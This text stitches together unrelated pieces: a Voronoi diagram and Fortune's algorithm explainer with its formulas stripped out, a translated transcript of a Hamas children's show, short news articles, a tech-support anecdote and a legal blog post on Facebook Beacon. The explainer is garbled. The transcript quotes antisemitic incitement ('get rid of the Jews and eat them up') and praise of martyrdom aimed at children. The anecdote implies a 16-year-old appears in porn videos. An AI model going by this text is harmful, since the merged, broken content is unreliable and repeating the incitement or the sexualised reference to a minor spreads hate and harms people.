A particularly noteworthy application appears in John Snow 's analysis of the London cholera outbreak of 1854 .
The following map , included in Snow 's Report on the Cholera Outbreak in the Parish of St. James , Westminster , During the Autumn of 1854 , shows the distribution of deaths due to cholera .
Each bar represents a death at that address .
Snow then considered the sources of drinking water , pumps distributed throughout the city , and drew a line labeled " Boundary of equal distance between Broad Street Pump and other Pumps , " which essentially indicated the Broad Street Pump 's Voronoi cell .
This map supported Snow 's hypothesis that the cholera deaths were associated with contaminated water , in this case , from the Broad Street Pump .
Snow recommended to the authorities that the pump handle be removed , after which action the cholera outbreak quickly ended .
As Snow 's work helped develop the modern field of epidemiology , this map has been called " the most famous 19th century disease map . "
Constructing Voronoi diagrams
In this article , we 'll imagine we are given a finite collection of sites and will see how to efficiently construct its Voronoi diagram .
When first confronted with this problem , it may seem most straightforward to consider every pair of points .
An important fact is that if we are given two points and , then the perpendicular bisector of the line segment joining those two points consists precisely of the points that are the same distance from as from .
In fact , we may want to think of the perpendicular bisector as dividing the plane into two half - planes , one containing the points that are closer to and the other containing the points that are closer to .
We will use to denote the half - plane containing the points that are closer to .
Constructing the Voronoi diagram then seems rather simple : to find the collection of points that are closer to than any other site , we simply take the intersection of all the half - planes .
That is , the Voronoi cell containing the site is given by .
Of course , as the figure on the right shows , some of the work we are doing here is not necessary ; that is , some of the sites that are relatively far away from have no influence on the Voronoi cell of .
In fact , when there is a large number of sites , we would expect that the Voronoi cell of one particular point is determined by relatively few of the other sites .
If we use this method when there are sites , we need to consider the other sites to find the Voronoi cell of a particular site .
Since each site has its own Voronoi cell , we need to construct Voronoi cells , which would require us to construct half - planes .
For instance , if we have 1000 points , we would need to construct approximately one million half - planes .
It appears that implementing this method will require us to do a lot of work , much of which is unnecessary .
A natural question is whether there is a more efficient way to compute Voronoi diagrams .
Fortune 's algorithm
In fact , there are several ways to find Voronoi diagrams , one of which is known as Fortune 's algorithm .
This algorithm is based on the following clever idea : rather than considering distances between the various sites , we will introduce a line that moves through the plane and use this line to facilitate a more efficient comparison of distances .
We call this line the sweep line and think of it as uncovering the Voronoi diagram as it sweeps through the plane .
Let 's first remember that if we are given a point and a line ( not containing ) , then the set of points whose distance to equals its distance to forms a parabola .
We will use to denote this parabola .
As before , it is helpful to think of the parabola as dividing the plane into two regions : one consisting of points closer to and other consisting of points closer to .
This is an important point so let 's make it a little more clear .
Consider a point whose coordinates are and whose distance to is denoted by .
In what follows , the sweep line will always be a horizontal line ; we will call its vertical coordinate so that the distance between and is .
The condition that lies on the parabola is therefore
or , more generally ,
if lies above ,
if lies on , and
if lies below .
Now the horizontal sweep line will move down through the plane .
At any time , we will only consider the sites that lie above the sweep line and the parabolas defined by those sites .
For instance , given the collection of sites and the position of the sweep line shown on the left below , we will consider the parabolas as shown on the right .
Now we can introduce the real star of Fortune 's algorithm : the beach line is the curve formed by the lowest parabolic arcs .
That is , any vertical line will pass through several parabolas ; the point at which the vertical line passes through the beach line is the lowest such point .
Notice that each of the arcs that composes the beach line is associated to one of the sites above the sweep line .
The beach line is well suited for constructing the Voronoi diagram .
For instance , if a point lies above the beach line , it must be closer to one of the sites above than to .
This means this point lies in the Voronoi cell of a site that the sweep line has already passed through .
Therefore , the Voronoi diagram above the beach line is determined by the sites above the sweep line .
This may be a good time to look at an animation that shows how the beach line changes as the sweep line moves down through the plane .
Let 's now determine when the beach line passes through some arbitrary point .
Suppose that is as close to site as any other ; that is , for all other sites .
The condition that lies on may be expressed as
and therefore
This means that when appears on , it cannot be above another parabola .
Therefore , when appears on the parabola , it is on the beach line .
Let 's summarize this important observation :
When a point appears on the beach line , it is on a parabolic arc associated to its nearest site .
The points on the beach line that lie on two parabolic arcs are called breakpoints .
Applying our observation shows that the breakpoints are nearest two sites .
In other words ,
The breakpoints lie on the edges of the Voronoi diagram .
This means that the breakpoints will sweep out the edges of the Voronoi diagram as the sweep line moves down the plane .
So to construct the Voronoi diagram , we simply need to keep track of the breakpoints .
Here is an animation that shows how the edges are formed by the breakpoints .
Finding the edges
So far , we 've seen that if we want to construct an edge of the Voronoi diagram , we simply need to keep track of the corresponding pair of breakpoints as the sweep line moves down the plane .
The first step in doing this is to detect when a pair of breakpoints is constructed .
This happens precisely when a new arc is added to the beach line as shown in the figures below .
In other words , a pair of breakpoints corresponding to an edge in the Voronoi diagram appears on the beach line when the sweep line passes through a new site .
We will call such an occurrence a site event .
Finding the vertices
As the sweep line moves down , the breakpoints move continuously along an edge of the Voronoi diagram until they reach a vertex of the diagram .
This happens when one of the parabolic arcs along the beach line disappears .
In the following sequence of pictures , notice that the second parabolic arc from the right in the left figure ( the smallest arc ) disappears .
The appearance of new parabolic arcs on the beach line is easily detected : they occur when the sweep line passes through a site .
Likewise , the disappearance of a parabolic arc is also easily detected .
When a parabolic arc shrinks to a point , that point then lies on three parabolas : the one containing the disappearing arc and the two parabolas containing the arcs on either side .
This means that is equidistant from three sites corresponding to these parabolas and that these three sites therefore lie on a circle centered at .
We therefore find the vertex when the sweep line passes through the bottom of that circle .
We call such an occurrence a circle event .
The change in the diagram therefore looks like this :
Notice that a new edge is also created by a circle event .
This corresponds to the fact that we have a new breakpoint formed as the intersection of the two parabolic arcs that were adjacent to the disappearing arc .
The algorithm
We now have everything we need to know to understand Fortune 's algorithm .
To detect edges and vertices in the diagram , it is enough to find the appearance and disappearance of parabolic arcs in the beach line .
We will therefore keep track of the beach line by imagining that we walk along it from left to right and record the order of the sites that produce its constituent parabolic arcs .
We know that this order will not change until the sweep line reaches either a site event or circle event .
Also , the breakpoints are implicitly recorded by noting the adjacency of the parabolic arcs on the beach line .
If the next event that the sweep line encounters is a site event , we simply insert the new site into our list of sites in the order in which the corresponding parabolic arc appears on the beach line .
We then record the fact that we have encountered a new edge in the diagram .
If the next event that the sweep line encounters is a circle event , we record the fact that we have encountered a vertex in the diagram and that this vertex is the endpoint of the edges corresponding to the two breakpoints that have come together .
We also record the new edge corresponding to the new breakpoint that results from the circle event .
Whether we encounter a site or circle event , we will always check to see if we have added a new triple of parabolic arcs on the beach line that may lead to a future circle event .
It is also possible that we will remove a future circle event from consideration if the triple of parabolic arcs that led to it no longer exists after the event .
In this way , the diagram is constructed by considering the finite sequence of events .
Shown below is the sequence of events that computes the Voronoi diagram of the collection of sites shown .
Circle events are indicated by green dots .
Summary
Fortune 's algorithm is a remarkably efficient way to compute the Voronoi diagram .
Whichever algorithm we use , we should expect that having more sites will require more work to find the Voronoi diagram .
We can , however , be more precise about this .
Earlier , we considered an algorithm for finding the Voronoi diagram by finding each Voronoi cell by intersecting each half - plane containing the site .
If is the number of sites , the number of steps required to implement this algorithm is proportional to .
For a typical diagram , however , the number of steps required to implement Fortune 's algorithm is proportional to , which represents a considerable improvement .
The graph below compares the computational effort for these two algorithms depending on the number of sites .

A new character has joined the cast of the Hamas TV children 's show " Pioneers of Tomorrow " - Assud the Bunny .
Assud 's return from " the diaspora " followed the death of his brother , Nahoul the Bee , on the show .
Nahoul was depicted as dying because he could not get to a hospital in Egypt for surgery .
Assud states , " We are all ready to sacrifice ourselves for the sake of our homeland .
We will sacrifice our souls and everything we own for the homeland " ; program host Saraa Barhoum concurs .
He also vows to " get rid of the Jews and eat them up . "
It will be recalled that Nahoul himself replaced Farfour , the Hamas mouse , who was killed by an Israeli soldier on the show in June 2007 .
The following are excerpts from Assud 's debut episode , which aired on Al - Aqsa TV February 2 - 9 , 2008 .

The Death of Nahoul
Nahoul : " I ca n't stand it , Mom , I can 't ... "
Mother : " What can I do ?
You 've been sick for a whole month .
We went to Al - Arish , but we could n't get you to Egypt to have an operation . "
[...]
Nahoul : " All the children of Palestine are dying without treatment .
I can't die , I do n't want to die ...
Father ... "
Attempts to perform CPR on Nahoul fail ; he expires .
Father : " Nahoul ! Nahoul ! "
[...]
" I Come from the Diaspora , Bearing the Key of Return "
Child host Saraa Barhoum : " Dear children , let me welcome on your behalf our new friend , Assud .
Allah be praised , our friend Assud has returned safe and sound to his land , to Palestine , after he emigrated to a different Arab country - a country which is not this noble homeland , dear children . " [...]
Assud : " Mom , I want to ask you something . "
Mother : " Go ahead . "
Assud : " Where is Nahoul ?
I have n't seen him for such a long time . "
Mother : " He went for a walk , and he 'll soon be back , Allah willing . "
Assud : " Where did he go ?
Who goes out at night ? "
Mother : " What do you want me to do ...
He 'll be back soon , Allah willing . "
Assud : " Father , where is Nahoul ? "
Father [ whispering to the mother ] : " How long can we keep what happened to Nahoul from him ? "
Father [ to Farfour ] : " You are a believer , and our God ... "
Assud : " What happened to Nahoul , father ? "
Father : " Allah be praised , you are a believing Muslim , and you know that we place our trust in Allah ...
Your brother Nahoul got sick ... "
Assud : " What hospital is he in , father ? "
Father : " He 's not in any hospital .
He died a martyr 's death , Allah have mercy upon him . "
Assud : " No , father ! " [ weeps ] [...]
Assud : " Just like Nahoul took Farfour 's place when he was martyred , I will replace Nahoul , Allah willing .
I will bring smiles and joy back to the children of Palestine , and the children of the whole world - the Arab and Islamic world , Allah willing . " [...]
Assud : " I come from the diaspora , bearing the Key of Return .
This is the Key of Return .
Do you see it ?
Allah willing , we will use this key to liberate our Al - Aqsa Mosque .
Here is a picture of the noble Al - Aqsa Mosque .
Here it is , can you see it ?
Allah willing , we are the soldiers of the Pioneers of Tomorrow . "
" We Are All Martyrdom Seekers "
Saraa Barhoum : " Yes , Assud , we will continue in the path of Nahoul and Farfour , Allah willing .
We will not let them down , Assud . "
Assud : " We are all martyrdom - seekers , are we not , Saraa ? "
Saraa Barhoum : " Of course we are .
We are all ready to sacrifice ourselves for the sake of our homeland .
We will sacrifice our souls and everything we own for the homeland . "
Assud : " Saraa , I 'd like to ask you something . "
Saraa Barhoum : " What is it ? "
" There Are Many , Many Soldiers of the Pioneers of Tomorrow ... We Will Liberate Al - Aqsa from the Filth of Those Zionists "
Assud : " How many soldiers of the Pioneers of Tomorrow are there ? "
Saraa Barhoum : " There are many , many soldiers of the Pioneers of Tomorrow . "
Assud : " Allah be praised . "

Saraa Barhoum
" His name is Assud [ ' Lion ' ] . "
Girl : " How come you are called Assud , even though you look like a rabbit ? "
Assud : " Because a rabbit is not good .
He 's a coward .
But I , Assud , will get rid of the Jews , Allah willing , and I will eat them up , Allah willing , right ? "
Saraa Barhoum : " Allah willing . "
SAN FRANCISCO ( MarketWatch ) --
With its long history in the computer business , Apple Inc. is no novice when it comes to hackers .
But even Apple AAPL , - 0.75 % seems to have been caught off - guard by the wave of consumers breaking into its latest gizmo , the iconic iPhone , in an effort to " unlock " the device from having to operate within the network of its exclusive telecom - service partners , which include AT&T in the U.S .
The trend has been a mixed blessing for Apple .
On the one hand , the company is still selling plenty of the devices , which rank as the most expensive wireless phone on the market .
On the other hand , iPhones that go unlocked are used on unsanctioned networks , denying Apple the ongoing revenue stream it has worked hard to secure through exclusive deals with its carrier partnerships .
" The issues for Apple are that they just started in this business , they have exclusive deals with certain carriers and the iPhone is not available globally , yet , " said Tina Teng , wireless communication analyst with iSuppli Corp. , an electronics research firm based in El Segundo , Calif .
" But they 've created hype and demand everywhere and Apple has to deal with that . "
Currently , the iPhone is only available for sale in the U.S. , the U.K. , France and Germany , where Apple has set up exclusive carrier relationships for each market .
But demand for the device is strong , and some consumers in other markets are apparently unwilling to wait .
The issue came into focus last month after both Apple and AT&T T , - 0.28 % reported their quarterly results , which showed a large discrepancy between the 3.7 million units Apple said it had sold by the end of the December period and the 2 million iPhone account activations AT&T claimed it had processed in the same period .
The missing 1.7 million iPhones -- even when accounting for projected sales in Europe -- suggest that there are more than just a few random hackers sitting in their garages cracking open the devices just for the fun of it .
“ ' They 've created hype and demand everywhere and Apple has to deal with that . ' ” — Tina Teng , iSuppli Corp .
Impatient customers
Estimates of the number of unlocked iPhones on the market range between 400,000 and more than 1 million .
There have been reports of the iPhone being used everywhere from Australia to India to China -- countries where the iPhone is n't officially on sale .
In addition , some customers in the U.S. may want the iPhone , but may also be unwilling to switch over to AT&T 's network .
Some early iPhone hackers altered the device to work with T - Mobile , another U.S. carrier that operates a network similar to AT&T's , but does not have a deal with Apple for the iPhone .
Such instances show the breadth of demand for one of the most - hyped technological products of the decade .
That demand goes beyond the limits of Apple and its current network partners to completely control how the iPhone is distributed around the world .
And since the iPhone must be unlocked to work in those markets , the estimated numbers of unlocked iPhones is high enough that there are rising concerns about the implication for such unregistered phones on Apple 's future revenue as the company tries to establish itself in the mobile phone market .
" The way the iPhone is being sold , there is a plan with each [ network ] operator for sharing revenue , " said Shiv Bakhshi , director of mobile device research at IDC .
" If you unlock the phone , you 're going to go to a different carrier and that means that much less ongoing revenue for Apple . "
In the U.S. , iPhone subscribers are locked into a two - year contract when they activate their phones with AT&T .
Apple does n't divulge exact figures for how much it receives from AT&T or its other wireless partners for each iPhone subscriber , but analysts estimate the company takes in anywhere between $ 10 and $ 20 a month for every customer who uses the device .
Apple unclear on impact
For its part , Apple 's tight - lipped about what impact unlocked iPhones could eventually have on the iPhone strategy , and the corporation 's bottom line .
An Apple spokeswoman would n't comment .
But Chief Operating Officer Tim Cook touched on the matter during a Jan. 22 conference call to discuss Apple 's quarterly results .
Cook said the number of unlocked iPhones " was significant in the quarter , but we 're unsure how to reliably estimate the number . "
Apple tries to make it as difficult as possible to unlock an iPhone .
The device comes with just two buttons , one to turn it on and another on the iPhone face that activates the screen .
There 's a SIM card that contains information that helps the phone connect to the AT&T network , and which can be ejected with the use of a paperclip or small pin .
But taking the SIM card out and replacing it with one from another wireless carrier does n't immediately unlock the iPhone .
To unlock it , a user needs to either break it open , being careful to avoid inflicting permanent damage , and then make changes to both the hardware and software inside the iPhone 's casing .
A software kit can be used to override the links to AT&T 's network in the U.S. , O2 in the U.K. , Orange in France and T - Mobile in Germany .
Finding such a software kit is n't difficult .
A search on eBay for iPhones brings up several listings for SIM card kits that claim to make the iPhone capable of working on any GSM wireless network , with prices starting as low as $ 25 .
There are also actual iPhones for sale that the sellers have already been unlocked for use on any wireless network .
Blessing or a curse ?
For Apple , unlocked iPhones are a double - edged sword .
The company has set a goal of selling 10 million of the devices this year , and even if an iPhone ends up as unlocked , it still counts as a sale toward Apple 's revenue targets .
However , while that initial $ 399 for every iPhone sold delivers a strong premium to Apple , it is the recurring revenue from iPhone subscribers which is considered just as important to Apple 's future success with its mobile phone venture .
Analyst Toni Sacconaghi , of Bernstein Research , estimates that if there were already 1 million unlocked iPhones at the end of 2007 , that would account for more than one - quarter of all the devices reported as sold by that time .
For every 1 million iPhones that go unlocked , Sacconaghi estimates that Apple misses out on between $ 300 million and $ 400 million in future sales and earnings , because the devices do n't generate any ongoing payments from wireless carriers .
Apple has a stated sales goal of 10 million iPhones for 2008 .
Sacconaghi says that if 30 % of those phones end up being unlocked , Apple 's total sales and earnings would be lower by $ 500 million in each of the next two years .
He said Apple could cut the price on the iPhone in order to stimulate sales and attempt to counter some of the losses of recurring revenue .
But such a move could result in profit margins on unlocked devices falling to levels that are unacceptable to the company , and lead to even more demand for unlocked iPhones around the world .
" This would make it even more difficult to extract revenue sharing from carriers , " Sacconaghi said in a research note .
" Exactly when revenue sharing becomes even more critical to the [ iPhone 's ] economics . "
A number of US states are considering legislation to lower the legal drinking age from the current standard of 21 - if only to allow troops coming home from Iraq to drink .
The move would defy a generation of federal law and public opinion , which is strongly opposed to lowering the drinking age .
In 1984 Congress set a uniform legal age of 21 , threatening to cut highway funding to states which did not comply .
Despite the risk of penalties , however , seven US states are exploring lowering the drinking age - partly for under - age Iraq war vets and more broadly in recognition that teenagers are going to drink anyway .
" If you can take a shot on the battlefield you ought to be able to take a shot of beer legally , " said Fletcher Smith , who has sponsored legislation to lower the drinking age in South Carolina .
Kentucky , Wisconsin , and South Carolina have introduced legislation to lower the drinking age for troops to 18 .
Four other states - Missouri , South Dakota , Minnesota , and most recently Vermont - would extend the privilege to the general population .
However , South Dakota would only allow 18 - 20 year olds to buy low - alcohol beer .
Advocates of a lower drinking age argue that teenagers are drinking , and that the secrecy encourages binge drinking among young people .
" Our laws are n't working .
They 're not preventing underage drinking .
What they 're doing is putting it outside the public eye , " Hinda Miller , a Vermont state senator , told reporters yesterday , after a committee took up her bill to study lowering the drinking age .
" So you have a lot of kids binge drinking .
They get sick , they get scared and they get into trouble and they can't call because they know it 's illegal . "
While the move would be popular with college students and other young people obliged to pay for fake ID if they want a night on the town , there is concerted opposition to lowering America 's drinking age .
Mothers Against Drunk Driving and other pressure groups say raising the drinking age a generation ago has cut traffic related deaths among young people by 13 % .
States that do lower their drinking age would also pay a heavy penalty under current legislation that would require them to forfeit 10 % of their highway fund from the federal government .

Sunday WTF
Yay for Sunday supervisor calls .
Guy calls in , he 's angry .
Madder than our usual , " Your cable sucks ! " people .
His daughter 's computer was n't working and someone told him how to restack his TCP / IP ( Which we are n't suppose to do ) and it ended up crashing his virus software .
So internet work , virus scan no worky .
I understand why he would be mad about that .
I walked him through loading our free anti-virus software to clean his daughter 's computer up enough that it'll work a little faster and be some what protected until he can contact his current anti-virus company for support .
That is done , computer is being cleaned and he starts complaining about lesbian porn popups and god forbid his 16 year old daughter see them .
Suddenly , the anti-virus pauses to scan a folder titled , " Circus Clips . "
He says to me , " Circus clips , my daughter must love the circus this is taking a long time . "
I mention she probably has videos and stuff and we go on .
Some time later the scan is done and the guy says , " I think I 'll view one of my daughters videos to see if it 's streaming any faster .
What do you think , Elephants rides or lions ? "
I pick Lions because who does n't like lions ?
So there is silence and then ... the unmistakable sound of porn music and fake " OOOOOHs "
Guy quickly shuts it off , apologizes to me and says the damn virus must have gotten to that clip .
So we go to Elephant rides 1 - 5 .
Queue porn music and such .
He goes , " Hold on , I 'm going to look at these high school photos folder . " -
More lesbian porn .
And then ...
" WHAT THE HELL !
BRITNEY GET YOUR ASS UP HERE ! "
Few moments later :
" What Daddy ? "
" IS THIS YOU ? "
" Um . . . "
" OH MY GOD ! MY GOD ! " * Pauses *
" Thank you ma'am I wo n't be needing your help any more . "

There is one participant for each of Angola 's provinces Landmine victims are to take part in a beauty contest in Angola , where tens of thousands have been injured by mines .
The pageant has been organised by Angola 's de-mining commission , and aims to restore the confidence of victims and raise awareness of their plight .
Millions of mines were planted in Angola during a 27 - year civil war that ended in 2002 .
The " Miss Landmine Survivor " contest will be held on 2 April in a luxury hotel in the Angolan capital , Luanda .
Eighteen women will take part , one from every province in the country .
All of the contestants have been maimed by landmines .
' Ambassadors '
The co-ordinator of Angola 's de-mining commission , Madalena Neto , says the aim of the competition is to restore self - esteem in women injured in mine explosions , and to show that there is beauty in all people .
Angola is still littered with millions of mines
She says she wants the contestants to become ambassadors for victims of landmines .
Tens of thousands of Angolans have lost limbs or suffered other injuries in mine explosions .
And they continue to do so , even though the war ended six years ago .
It is rare to visit an Angolan town or village without seeing people struggling to cook , care for children or otherwise get on with their lives whilst struggling with a stick or , if they are lucky , a pair of crutches or an artificial limb .
The UN says that , despite an extensive de-mining programme , millions of landmines remain littered across Angola - and this means great stretches of the country are still out of bounds , too dangerous to farm or to travel through .
Perhaps the " Miss Landmine Survivor " contest will remind the rich and powerful in central Luanda that there is still a lot of work to be done , both in terms of ridding the country of landmines and of improving the lives of their victims .

Facebook and the VPPA : Uh-Oh
December 10 , 2007 at 1:14 AM
19 Comments
The Facebook Beacon story has been igniting privacy debates for a while , and has caused the company some serious embarrassment .
I think it could cause them much worse .
Another member of a professorial mailing list I ’m on asked whether Facebook may have violated the Video Privacy Protection Act of 1988 .
Nicknamed the “ Bork Bill ” ( a newspaper published his video rental records during his confirmation hearings ) , the VPPA protects your privacy in the videos you rent and buy .
Well , guess what ?
One of Facebook ’s Beacon partners was Blockbuster , so some of the items that wound up in people ’s news feeds were the names of videos they ’d bought .
Oops .
I dug a bit into the legalities of the issue , and this is roughly what I came up with : Facebook and Blockbuster should hunker down and prepare for the lawsuits .
Their recent move to allowing a global opt - out may cut them off from accruing further liability , but there ’s probably an overhang of damages facing them from their past mistakes .
I should note that this is n’t my usual area of law , so salt the analysis appropriately .
Caselaw on the VPPA is thin , but there might be other rules of information privacy law out there that would significantly change the bottom line .
That said , let us begin .
The VPPA states :
A video tape service provider who knowingly discloses , to any person , personally identifiable information concerning any consumer of such provider shall be liable … .
18 U.S.C. § 2710 ( b ) ( 1 ) .
The important first question is who ’s a “ video tape service provider . ”
That ’s defined in paragraph ( a ) ( 4 ) :
[ T ]he term “ video tape service provider ” means any person , engaged in the business , in or affecting interstate or foreign commerce , of rental , sale , or delivery of prerecorded video cassette tapes or similar audio visual materials … .
Thus , it ’s fairly clear that Blockbuster is a “ video tape service provider ” but Facebook and its users are n’t .
There are also a pair of important legal principles that could make things much dicier for Blockbuster .
If the disclosures by Facebook or a user are involuntary , then torts law ordinarily puts the liability on whoever set the unfortunate process in train .
It ’s like persuading a six - year - old to commit fraud for you , or grabbing a pirate ’s sword arm and forcing him to slice someone with his cutlass .
As we ’ll see , this could make Blockbuster liable for disclosures technically made by its customers .
If Facebook and Blockbuster agreed to act in concert to do something , then doctrines of principal - and - agent and joint enterprise often allow their actions and motives to be attributed to each other .
That would let things done by Facebook be counted as having been done by Blockbuster , possibly making Blockbuster liable for disclosures technically made by Facebook .
With these rules in mind , let ’s look at the facts to see if there were any relevant disclosures of personally identifiable information .
The typical sequence of relevant information flows in the days before a global opt - out went something like this :
Ethan visits Blockbuster and clicks to buy The Producers .
Ethan ’s click causes some functions ( written by Facebook , sent to Ethan by Blockbuster ) to execute in Ethan ’s browser .
Those functions create an “ iframe ” ( a kind of sub - page ) within the Blockbuster page on Ethan ’s browser .
The iframe communicates with Facebook , telling it that the currently - logged - in user ( Ethan ) has just bought The Producers .
The iframe tosses a pop-up window ; if Ethan clicks “ no ” in the pop - up , the dance stops here .
Joel , who is on Ethan ’s friends list , sees that Ethan bought The Producers .
There are two possible sources of VPPA trouble here .
First , in step ( 4 ) when Facebook found out that Ethan had purchase The Producers , that might have been a disclosure either by Ethan or by Blockbuster .
Second , in step ( 6 ) when Ethan ’s friends found out that he ’d bought it , that might have been a disclosure by Ethan or by Facebook .
Let ’s start with the disclosure to Facebook ( step ( 4 ) ) .
Blockbuster looks like it has a strong argument here that Ethan was the discloser , not it .
After all , it was Ethan ’s browser that told Facebook what he ’d rented , not Blockbuster ’s web site .
Since Ethan is n’t a video tape service provider , that ’s the end of the story .
I do n’t think that argument works , though , because Ethan ’s disclosure to Facebook is pretty much a textbook example of an involuntary act .
Yes , Ethan ’s browser did the heavy lifting .
But it did so because Blockbuster included some HTML on its page .
Ethan did n’t parse the javascript and load the iframe himself , and if he was like me , he probably did n’t even realize that Blockbuster could get his browser to give Facebook that combination of information .
( The trick works because the iframe both has some info that Blockbuster gave it and “ belongs ” to Facebook and can therefore access Ethan ’s Facebook account .
Awful clever , ai n’t it ? )
Ethan ’s browser was acting as Blockbuster ’s agent , not Ethan’s .
Once we have that first disclosure , the disclosure by Facebook ( step ( 6 ) ) is easier .
Facebook is acting in concert with Blockbuster , which is under a duty not to disclose .
On principal - and - agent reasoning , Blockbuster effectively made those disclosures , and is therefore liable for them .
( I ’m not sure you could get this result on your own if you looked just at step ( 6 ) .
The reasons are a bit subtle .
Yes , it looks as though Blockbuster and Facebook are engaged in a scheme to reveal PII , but you need to be careful about the source of that PII .
If Ethan had used the Movies app to tell Facebook voluntarily that he liked The Producers ( which , purely incidentally , he bought online from Blockbuster ) , I do n’t think Blockbuster has a duty to keep that fact from disclosure .
A critical nexus has been sundered .
That ’s why we need to look at step ( 4 ) — to see whether it sunders the nexus between the purchase and information about that purchase .
I think that the way Beacon operates means that the nexus is still intact ; if you disagree with me about my characterization of step ( 4 ) , you ’ll think that Facebook takes the information free and clear , and owes no duty to anyone , even if Blockbuster is involved .
There are some further legal complexities here that involve some very precise statutory reading , but I ’ll omit them so as not to get into a digression from a digression . )
So that ’s an affirmative case for some serious liability .
Blockbuster could try to interpose a few defenses .
I do n’t think any of them work , but they ’re worth discussing .
First , Beacon successfully identifies Ethan here even if he buys the movie from Blockbuster under a false name .
The critical step is that the same person both buys the movie and is logged into Facebook .
Thus , there will be some scenarios in which Blockbuster causes Ethan to be identified without itself having had any knowledge of his identity .
In those cases , it seems hard to frame an argument that you can “ disclose ” something you never knew .
Nonetheless , given the statutory definition of PII ( “ includes information which identifies a person as having requested or obtained specific video materials ” ) , Blockbuster can “ identif[y ] ” Ethan as having bought The Producers whether it knows who he is on Facebook or not .
It provides to Facebook information sufficient to say that Mr. X bought a movie , and Facebook knows who Mr. X is .
Second , Blockbuster could argue that its step - ( 4 ) disclosure is “ to the consumer ” and thus allowed under subparagraph ( b ) ( 2 ) ( A ) of the VPPA .
That works as to the information flows in steps ( 1 ) and ( 2 ) , in which Blockbuster tells Ethan ’s browser some things , but it does n’t work as to the information flow in step ( 4 ) .
Facebook is not the “ consumer ” no matter how hard you stretch and strain .
It also does n’t work in step ( 6 ) ; if you think of the other users as the “ consumer , ” you ’ve pretty much completely eviscerated the VPPA .
Third , there ’s the whole can of worms around the temporary pop-up that Facebook showed to let users opt - out of sharing details .
Each site using Beacon used to show users a pop-up letting them avoid having the transaction listed .
Subparagraph ( b ) ( 2 ) ( B ) allows disclosure with “ the informed , written consent of the consumer given at the time the disclosure is sought . ”
Those pop-ups failed that test in multiple ways :
They vanished if the user did nothing for twenty seconds or so .
You can pretty much guarantee that some users wo n’t see the pop - up at all .
So much for “ informed . ”
It ’s been revealed that if you ’d ever clicked “ remember me ” on Facebook , it would remember you in spades .
Even if you were n’t logged in , your Beacon transactions would still result in personally - identifying web requests hitting Facebook ’s servers — regardless of any opt - out requests .
So much for “ consent . ”
Regardless of what Facebook ’s request for consent looked like , Blockbuster ’s was pretty clearly defective — viz . : nonexistent .
Indeed , by the time you see the pop-up , your browser has already sent the critical step - ( 4 ) request to Facebook .
All that saying “ no ” does is to prevent step ( 6 ) from happening .
Thus , on my reasoning above , the user ca n’t prevent the first and critical disclosure from happening .
So much for “ given at the time the disclosure is sought . ”
Indeed , if my analysis of step ( 4 ) is correct , then Facebook ’s current policy ( failure to click on the pop- up constitutes refusal , not acceptance ) is still defective .
It ’s too late at that point to keep Facebook from learning that you , yes you Ethan K — , bought The Producers .
The violations might still be accumulating .
Facebook ’s only arguable out would be that the company ’s servers are n’t a “ person , ” so there ’s been no actionable disclosure .
I need to think more on this angle , but I have my suspicions that it might be too slender a reed to support Facebook ’s awesome weight .
So that ’s Blockbuster .
What about Facebook ?
There ’s the joint enterprise theory ; since Facebook and Blockbuster acted together , and Blockbuster is liable , so too is Facebook .
There ’s a split in the VPPA caselaw as to whether liability runs only against the video tape service provider , or can run also against the person who induced the disclosure .
Those cases , though , typically involve police officers getting rental information without going through proper law enforcement channels ( a search warrant , grand jury subpoena , or court order ) .
I ’m not sure quite how they ’d apply here , where Facebook is more clearly acting in concert with Blockbuster to engage in further disclosures .
My sense is that Facebook could win or could lose , depending on how the court chooses to interpret the VPPA .
The risks are substantial .
Put this all together , and the legal situation looks a bit bleak for Facebook and Blockbuster .
The VPPA provides damages of $ 2,500 per violation , plus punitive damages and attorneys ’ fees .
I have no idea how many movies wound up in people ’s news feeds , but it does n’t have to be too many for the total to hurt .
Class action lawyers , start your engines .
Addendum 2007 - 12 - 11 :
There ’s an interesting discussion over at Concurring Opinions of the “ marketing exception ” of subparagraph ( b ) ( 2 ) ( D ) .
That exception allows disclosures of the genres of movies you rent , if there ’s a “ clear and conspicuous ” opt - out , and “ for the exclusive use of marketing goods and services directly to the consumer . ”
The exception fails in at least three (! ) ways :
“ Clear and conspicuous ” opt - out ?
I do n’t think so , not if the opt - out pop - up disappears on you .
Beacon showed actual titles , not just genres .
Marketing to the consumer ’s friends is different from marketing “ to the consumer . ”
Addendum 2007 - 12 - 11 : heebner , in comments , raises the issue of whether Facebook is a “ person . ”
It is .
The definitions section ( 18 U.S.C. § 2711 ) for the chapter of the U.S. Code that includes the VPPA ( 18 U.S.C. ch. 121 ) includes a bunch of definitions from another definitions section ( 18 U.S.C. § 2510 ) , including one that defines “ person ” as :
any employee , or agent of the United States or any State or political subdivision thereof , and any individual , partnership , association , joint stock company , trust , or corporation .
My apologies for previously making that issue seem harder than it is , and thanks to heebner and Mike Malone for bringing it up .

Many animals can sense the Earth ’s magnetic field , so why not people , asks Oleg Shumilov of the Institute of North Industrial Ecology Problems in Russia .
Shumilov looked at activity in the Earth ’s geomagnetic field from 1948 to 1997 and found that it grouped into three seasonal peaks every year : one from March to May , another in July and the last in October .
Surprisingly , he also found that the geomagnetism peaks matched up with peaks in the number of suicides in the northern Russian city of Kirovsk over the same period .
Shumilov acknowledges that a correlation like this does not necessarily mean there is a causal link , but he points out that there have been several other studies suggesting a link between human health and geomagnetism .
Advertisement
For example , a 2006 review of research on cardiovascular health and disturbances in the geomagnetic field in the journal Surveys in Geophysics ( DOI : 10.1007/s10712-006-9010 - 7 ) concluded that a link was possible and that the effects seemed to be more pronounced at high latitudes .
Twinned peaks
The review ’s author , Michael Rycroft , formerly head of the European Geosciences Society , says that geomagnetic health problems affect 10 to 15 % of the population .
“ Others have found similar things [ to Shumilov ’s results ] in independent sets of data , ” says Rycroft .
“ It suggests something may be linking the two factors . ”
A 2006 Australian study , for example , also found a correlation between peaks in suicide numbers and geomagnetic activity ( Bioelectromagnetics , vol. 27 p 155 ) .
Brain storms
Psychiatrists too have noticed a correlation between geomagnetic activity and suicide rates .
A review of 13 years of South African data on suicides and magnetic storms in South African Psychiatry Review , vol. 6 p. 24 ) suggested a link .
Geomagnetic storms – periods of high geomagnetic activity caused by large solar flares – have also been linked to clinical depression .
In 1994 , a study was published suggesting a 36.2 % increase in the number of men admitted into hospital for depression in the second week after geomagnetic storms ( British Journal of Psychiatry vol 164 , p 403 ) .
What may be the cause of the link , if there is one , remains unknown .
“ The intriguing correlation between geomagnetism and suicide justifies more research into its mechanism , ” says Rycroft .
